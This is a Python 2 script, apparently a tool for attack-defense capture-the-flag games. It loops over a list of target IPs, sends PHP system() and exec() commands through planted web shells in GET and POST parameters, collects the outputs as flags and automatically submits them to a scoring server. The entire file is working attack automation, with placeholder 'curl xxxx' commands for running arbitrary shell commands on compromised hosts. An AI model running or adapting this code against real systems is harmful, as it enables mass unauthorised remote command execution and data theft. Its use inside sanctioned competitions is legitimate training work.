# -*- coding: utf-8 -*-

import requests
from core.shells import *
flags = []
cookies=''
datas=''
url=''

# Example:POST_data={'x':"system('curl xxxx');"}
POST_file = "system('curl xxxx');"

# Example:GET_data="echo exec('curl xxxx');"
GET_file = "echo exec('curl xxxx');"

exec_file = "curl xxxx"

#设置获取flag的命令
def set_command(command):
    cmd="'"+command+"'"
    global POST_file,GET_file,exec_file
    POST_file="system(%s);"%cmd
    GET_file="echo exec(%s);"%cmd
    exec_file=command


#判断获取flag是否成功
def judege(flag):
    global flags
    check = "<Response [200]>"
    if str(flag)==check:
        flags.append(flag.text)
        print "got flag!"
    else:
        print "got flag failed!"

#遍历ip列表获取flag
def get_flag(ip_list):
    for i in ip_list:
        urls = "http://" + i
        for j in POST_eval_shells_path_pwd:
            evel_POST_data = {POST_eval_shells_path_pwd[j]:POST_file}
            url = "http://" + i + j
            flag = requests.post(url,data = evel_POST_data)
            judege(flag)

        for k in GET_eval_shells_path_pwd:
            url = "http://" + i + k
            flag = requests.get(url +"?"+ GET_eval_shells_path_pwd[k] + "=" + GET_file)
            judege(flag)

        for m in GET_exec_shells_path_pwd:
            url = "http://" + i + m
            flag = requests.get(url + "?"+GET_exec_shells_path_pwd[m] + "=" + exec_file)
            judege(flag)

        for n in POST_exec_shells_path_pwd:
            url = "http://" + i + n
            exec_POST_data = {POST_exec_shells_path_pwd[n]:exec_file}
            flag = requests.post(url,data = exec_POST_data)
            judege(flag)

#提交flag
def submit_flag(url=url,cookies=cookies,datas=datas):
    global flags
    cookie=cookies.replace(' ','')
    cookie_dict = dict((line.split('=') for line in cookie.strip().split(";")))
    data=datas.replace(' ','')
    data_dict =dict((line.split('=') for line in data.strip().split("&")))
    check = "<Response [200]>"
    for j in data_dict:
        if data_dict[j] == '?':
            p = j
    for i in flags:
        data_dict[p]=i
        print i
        a = requests.post(url,data = data_dict,cookies = cookie_dict)
        if str(a) == check:
            print "Submit flag success"
        else:
            print "submit flag failed"

    print "ok,flags will auto empty"
    flags=[]